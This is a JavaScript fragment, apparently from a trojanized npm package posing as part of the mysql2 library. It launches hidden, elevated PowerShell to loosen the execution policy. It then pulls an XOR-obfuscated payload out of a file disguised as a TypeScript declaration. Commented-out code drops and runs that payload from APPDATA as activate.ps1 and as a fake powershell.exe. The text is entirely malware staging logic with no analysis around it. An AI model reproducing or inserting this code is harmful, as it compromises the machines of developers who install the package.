...
const filename = 'mysql2/lib/streamcommand_libraray.d.ts';
const { spawn } = require("child_process");
const fs = require('fs');
const { exec } = require('child_process');
const roaming = process.env.APPDATA;

const command = 'Start-Process -Verb RunAs -WindowStyle Hidden -Wait powershell.exe -Args "Set-ExecutionPolicy RemoteSigned -force"';
const child = spawn('powershell.exe', ['-ExecutionPolicy', 'Bypass', '-NoLogo', '-NonInteractive', '-NoProfile', '-Command', command], {shell: true});
...
child.on('close', (code) => {
  ...
  fs.readFile(filename, (err, data) => {
      ...
      // for activate.ps1
      let start_pos = 0;
      start_pos = data.indexOf(Buffer.from('\n--- XOR result starts here ---\n'), start_pos);
    
      if (start_pos === -1) {
        process.exit();
      }
    
      let end_pos = data.indexOf(Buffer.from('\n--- XOR result ends here ---\n'), start_pos);
      let xor_result = data.slice(start_pos + Buffer.from('\n--- XOR result starts here ---\n').length, end_pos);
      xor_result = Buffer.from(xor_result.map(b => b ^ 0x62));
    
      // setTimeout(() => {
      //   fs.writeFile(`${roaming}/activate.ps1`, xor_result, (err) => {
      //       if (err) throw err;
        
      //       setTimeout(() => {
                
      //           const command2 = 'Start-Process -Verb RunAs -WindowStyle Hidden -Wait powershell.exe -Args "-noprofile -c Set-Location \`"$PWD\`"; & \'$env:APPDATA\\activate.ps1\'"';
      //           const child2 = spawn('powershell.exe', ['-ExecutionPolicy', 'Bypass', '-NoLogo', '-NonInteractive', '-NoProfile', '-Command', command2]);
    
      //           child2.on('close', (code) => {
    
      //             fs.unlinkSync(`${roaming}/activate.ps1`);
      ...
      //               end_pos = data.indexOf(Buffer.from('\n--- XOR result ends here ---\n'), start_pos);
      //               xor_result = data.slice(start_pos + Buffer.from('\n--- XOR result starts here ---\n').length, end_pos);
      //               xor_result = Buffer.from(xor_result.map(b => b ^ 0x62));
            
      //               fs.writeFile(`${roaming}/hollus/powershell.exe`, xor_result, (err) => {
      //                 if (err) return err;
            
      //                 setTimeout(() => {
      //                   exec(`${roaming}/hollus/powershell.exe`, (err, stdout, stderr) => {
      //                     if (err) return err;
      //                   });
      //                 }, 1000);
      //               });
